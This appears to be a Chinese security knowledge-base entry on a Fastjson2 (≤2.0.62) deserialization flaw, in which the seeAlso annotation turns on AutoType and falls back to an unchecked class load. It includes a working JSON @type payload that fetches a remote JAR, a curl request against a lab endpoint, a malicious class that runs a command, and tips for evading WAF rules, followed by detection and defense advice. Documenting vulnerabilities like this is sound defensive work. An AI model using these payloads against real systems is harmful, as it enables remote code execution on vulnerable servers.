---
id: web-java-deser-fastjson2-seealso-fallback-loadclass-rce
title: Fastjson2 ObjectReaderSeeAlso 开启 AutoType 后回退 loadClass RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson2-seealso-fallback-loadclass-rce
aliases:
- fastjson2 SeeAlso 绕过
- ObjectReaderSeeAlso 回退
- 点号转斜杠 URLClassLoader
- jar:http 点号绕过
tags:
- java
- fastjson2
- deserialization
- autotype
- seealso
- urlclassloader
- jar-url
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: fastjson2 <= 2.0.62（2.0.63 修复，PR 7695 + 7703）
verification:
  verified_by: verifier-V3
  verified_at: '2026-11-04T21:46:56+08:00'
  notes: '已对照原文核对：ObjectReaderSeeAlso 构造开启 SupportAutoType、autoTypeSupport=true 分支回退 loadClass、点号转斜杠绕过 checkName、十进制 IP 与靶场请求一致；原文未配图。JDK 8/11+/17+ 的路径二结论与原文表格一致；PoC 未执行；affected_versions 已修正为不带 # 的完整区间。'
---

## 一句话结论

Fastjson2 ≤ 2.0.62 中，`@JSONType(seeAlso=...)` 生成的 `ObjectReaderSeeAlso` 会在构造时自动打开 `SupportAutoType`；此后任何哈希白名单检查失败的 `@type` 都会回退到无校验的 `TypeUtils.loadClass`。攻击者利用 `URLClassLoader.findClass` 把 `.` 转成 `/` 的机制，用一个不含 `/` 的 `jar:http:..IP.PORT.exploit!.Evil` 字符串通过 JDK `checkName`，最终加载远程 JAR 执行代码。

## 原理

- `ObjectReaderSeeAlso` 构造函数里传入 `JSONReader.Feature.SupportAutoType.mask`，因此只要应用使用了 `@JSONType(seeAlso=...)` 注解，解析该类型时 `autoTypeSupport` 就会被置为 true，即使全局默认是关闭的。
- 在 `autoTypeSupport=true` 分支，代码先做增量 FNV 哈希检查；若没有命中 accept 列表，继续走 `TypeUtils.getMapping(typeName)`，对未知类型返回 null，最后到达 `loadClass(typeName)`——这一步没有任何哈希或文本校验。
- 直接传 `jar:http://IP/evil.jar!/Evil` 会因包含 `/`、`:` 被 JDK 的类名校验 `checkName` 拒绝。关键绕过在于 `URLClassLoader.findClass` 会执行 `name.replace('.', '/')`：传入一个不含 `/` 的字符串，校验阶段看到的是合法的“类名”，加载阶段却被转换成 URL 路径。
- 构造 `jar:http:..2130706433:18000.exploit!.Evil`：`checkName` 看不到 `/`，通过；`findClass` 把 `.` 全换成 `/`，得到 `jar:http://2130706433:18000/exploit!/Evil.class`（`2130706433` 是 `127.0.0.1` 的十进制形式），从远程下载 JAR 并定义类。
- 类加载/初始化时执行 `static {}` 或构造代码，形成完整 RCE。此路径完全不需要 FNV 哈希碰撞，只需要应用存在一个使用 `seeAlso` 的类型和一个可控 `@type` 入口。
- 根因是“开启 AutoType 后回退到无校验加载”与“类名校验/URL 解析使用不同字符串变换”两点叠加。

## 触发条件

- 目标使用 fastjson2 ≤ 2.0.62。
- 应用存在 `@JSONType(seeAlso=...)` 标注的类型，且该类型会通过 `@type` 反序列化（例如 `/parseAnimal` 接收 `Animal` 的子类）。
- 攻击者可控 JSON 的 `@type` 字段。
- 目标可出网访问攻击者 HTTP 服务；JDK 8 及原文测试的 JDK 11+ 均可完成（原文表格标注路径二在 JDK 8/11+/17+ 均为完整 RCE）。
- 修复前 `:`、`!` 未被提前拦截。

## 利用步骤

1. 找到使用 `seeAlso` 的多态类型及其解析入口（如 `parseAnimal`）。
2. 准备恶意 JAR，内部类名与 URL 路径匹配（如 `Evil.class`），托管在 HTTP 服务。
3. 构造不含 `/` 的 `jar:` 字符串：`jar:http:..<IP>.<PORT>.<path>!.<Class>`；IP 可用十进制形式规避点号/斜杠限制。
4. POST `{"@type":"<构造串>"}`，观察目标是否下载 JAR 并执行。
5. 通过回连、DNS 或命令输出确认；若被 WAF 拦截，尝试调整点号/端口/路径编码。

## PoC

```json
{
  "@type": "jar:http:..2130706433:18000.exploit!.Evil"
}
```

`checkName` 阶段不含 `/`，通过；`URLClassLoader.findClass` 将点号转斜杠后得到：

```text
jar:http://127.0.0.1:18000/exploit!/Evil.class
```

```bash
# 原文靶场请求
curl -X POST http://127.0.0.1:8080/parseAnimal \
  -H "Content-Type: application/json" \
  -d '{"@type":"jar:http:..2130706433:18000.exploit!.Evil"}'
```

恶意 JAR 中的 `Evil` 类在静态初始化中执行命令：

```java
public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception ignored) {}
    }
}
```

## 变体与关联

- 远程 JAR 可用任意 HTTP 主机/端口；把 IP 写成十进制、八进制或省略形式可绕过只匹配点分十进制的规则。
- 修复后 `:`/`!` 被 `hasIllegalTypeNameChars` 拦截，但 `ObjectReaderSeeAlso` 仍会开启 `SupportAutoType`，回退 `loadClass` 仍可达；classpath 上不含特殊字符的恶意 gadget 类仍可能被加载，属于遗留风险。
- 与 FNV 路径的区别：本路径不需要注册 accept 名称或制造哈希碰撞，触发门槛取决于目标是否存在 `seeAlso` 类型。
- 关联：`[[web-java-deser-fastjson2-fnv-collision-autotype-bypass]]` 是同一版本的另一条独立路径；`[[web-java-deser-fastjson-resource-probing-rce]]` 是 fastjson 1.x 的资源探测绕过，代码路径不同。

## 检测与防御

- WAF/请求检测：`@type` 值中出现 `jar:`、`http:`、`file:`、`ldap:`、`rmi:`，或出现 `..`、`!.`、十进制 IP 与 `!` 组合；注意本路径的字符串不含 `/`，不能只匹配 `jar://`。
- 版本检测：fastjson2 ≤ 2.0.62 受影响；升级到 2.0.63 及以上。
- 运行时检测：`URLClassLoader` 加载远程 URL、`defineClass` 调用、JVM 对外下载 `.jar`；应用日志中出现异常 `@type` 值。
- 修复：升级 fastjson2；启用 SafeMode；避免使用 `@JSONType(seeAlso=...)` 多态反序列化，或将其限制在可信类型集合。
- 加固：升级 JDK 并限制远程类加载；对 `@type` 做完整文本白名单校验；WAF 同时拦截 `:`、`!`、`$`、`jar` 与点号编码形态；不使用不可信输入做多态反序列化。
